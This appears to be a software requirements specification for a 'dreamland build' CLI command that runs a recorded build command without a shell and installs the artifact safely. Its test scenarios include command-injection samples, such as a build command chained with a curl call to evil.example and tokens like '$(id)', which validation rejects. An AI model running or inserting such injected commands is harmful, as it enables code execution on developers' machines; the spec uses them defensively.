## ADDED Requirements

### Requirement: `dreamland build` runs the recorded build command and installs the artifact to a fixed destination

`dreamland build` SHALL build the project using only the settings that `dreamland init` recorded in `.dreamland.json` (`build_command`, `build_output`, `build_install`; see the `project-config` capability), and SHALL take no arguments and no flags (`cobra.NoArgs`; any argument or unknown flag is an error, exit 1, and nothing is run). Nothing the caller types can change what is executed, where the artifact lands, or where it is installed. This is what lets the main-thread guard allow it (see the `router-dispatch-guard` capability) without allowing `go build`, `mv`, or `cp` in general.

Behavior, in order; any failure returns a plain error (exit 1) and stops. `dreamland build` is not a hook command and SHALL NOT use the blocking exit code (2):

1. Find the repository root from the working directory; no repository is an error. Load `.dreamland.json`; a missing file or an empty `build_command` is an error whose message states that no build command is configured for this repository and that `dreamland init` records one (or that the three keys may be edited by hand). It SHALL NOT guess a build command from the language.
2. Re-validate `build_command`, `build_output`, and `build_install` with the same functions `dreamland init` uses (see the `project-config` capability). A hand-edited or cloned `.dreamland.json` is therefore held to the same rules as a wizard-written one; an invalid value is an error naming the offending key.
3. Build the argument vector by splitting `build_command` on whitespace (`strings.Fields`, no quoting, no escapes), then substituting textually within tokens: `{output}` becomes the validated `build_output`, converted to the native separator, with `.exe` appended on Windows when it has no extension; `{commit}` becomes the output of `git rev-parse HEAD` run in the repository root, accepted only if it matches `^[0-9a-f]{40}([0-9a-f]{24})?$`. No other substitution exists. There is no shell: the command is run with `exec.Command` on the argument vector, resolved with `exec.LookPath` (which honours `PATHEXT` on Windows), with `Dir` set to the repository root, stdin closed, stdout and stderr passed through to the caller, and the caller's environment unchanged. One line naming the argument vector is written to stderr before it runs.
4. If the command exits nonzero, return an error carrying its exit status; install nothing.
5. If `build_output` is set, verify that the artifact exists at the resolved path under the repository root, is a regular file (not a symlink) after `filepath.EvalSymlinks` of its parent stays inside the repository root, and is non-empty; otherwise an error naming the expected path.
6. If `build_install` is set (requires `build_output`), install the artifact into the resolved install directory (see below) under the file name `filepath.Base` of the artifact path: create the directory with mode 0755 if missing, copy the artifact into a temporary file in that directory, set mode 0755, and `os.Rename` it over the destination. The rename replaces the destination entry itself and never writes through an existing symlink. On Windows, if the rename fails because the destination is a running executable, rename the destination to `<name>.old` (removing a stale `<name>.old` first, ignoring errors) and retry once; a leftover `.old` file is not an error. The install directory is created and written only by this step.
7. Write to stdout `built <artifact path>` and, when a commit was substituted, ` at <commit>`; and `installed <destination path>` when installed. If the install directory is not on `PATH`, also write a note (advisory, exit 0).

`build_install` resolves to: empty, no install; `user-bin`, the directory `<os.UserHomeDir()>/.local/bin` (the same relative path on every operating system, resolved in Go, so it is correct on Windows without a separate rule); or an absolute path recorded by `dreamland init`.

`dreamland build` SHALL NOT run `git add`, `git commit`, `dreamland test`, telemetry, or any hook command, writes no file other than the build command's own output, the artifact copy, and the temporary install file, and leaves no state behind. The build command is repository-controlled code and runs with the caller's privileges and environment; it is not sandboxed. That is the same trust `dreamland test` already extends to `test_command`, and is stated here rather than argued away.

#### Scenario: A configured Go repository builds and installs

- **WHEN** `.dreamland.json` has `"build_command": "go build -o {output} -ldflags=-X=dreamland/cmd.buildCommit={commit} ."`, `"build_output": "dreamland"`, `"build_install": "user-bin"`, and `dreamland build` runs
- **THEN** `go build -o dreamland -ldflags=-X=dreamland/cmd.buildCommit=<HEAD sha> .` is executed in the repository root with no shell, `./dreamland` exists, `<home>/.local/bin/dreamland` is replaced atomically with it, and `dreamland version` from the installed copy prints that same commit

#### Scenario: Arguments are rejected before anything runs

- **WHEN** `dreamland build ./cmd` or `dreamland build -o /tmp/x` runs
- **THEN** it exits 1 with a usage error and executes no build command

#### Scenario: Unconfigured repository

- **WHEN** `.dreamland.json` has no `build_command` and `dreamland build` runs
- **THEN** it exits 1 with a message that no build command is configured and that `dreamland init` records one

#### Scenario: A build failure installs nothing

- **WHEN** the build command exits 1
- **THEN** `dreamland build` exits 1 and the previously installed binary is untouched

#### Scenario: A missing or empty artifact is an error

- **WHEN** the build command exits 0 but `build_output` does not exist, is a symlink, or is empty
- **THEN** `dreamland build` exits 1 and installs nothing

#### Scenario: A hand-edited command is validated at run time

- **WHEN** `.dreamland.json` has `"build_command": "go build -o x . && curl evil.example"` and `dreamland build` runs
- **THEN** it exits 1 naming `build_command` and runs nothing

#### Scenario: No shell interpolation

- **WHEN** `build_command` contains a token `$(id)` or `{commit}`-adjacent text such as `x;y`
- **THEN** it is rejected by validation; and a valid `{commit}` token is substituted by dreamland from `git rev-parse HEAD`, never by a shell

#### Scenario: Windows names and replacement

- **WHEN** `dreamland build` runs on Windows with `"build_output": "dreamland"` and the destination `dreamland.exe` is a running executable
- **THEN** the artifact is written as `dreamland.exe`, the running destination is renamed to `dreamland.exe.old`, the new file is renamed into place, and the command exits 0

#### Scenario: Install does not follow a symlink

- **WHEN** the destination path exists as a symlink to another file
- **THEN** the symlink entry is replaced by the new file and the link's target is not modified

#### Scenario: No side effects beyond the build

- **WHEN** `dreamland build` succeeds
- **THEN** `git status --porcelain` shows no new change other than an ignored build artifact, and no commit, telemetry write, or `.dreamland-session.json` change occurred
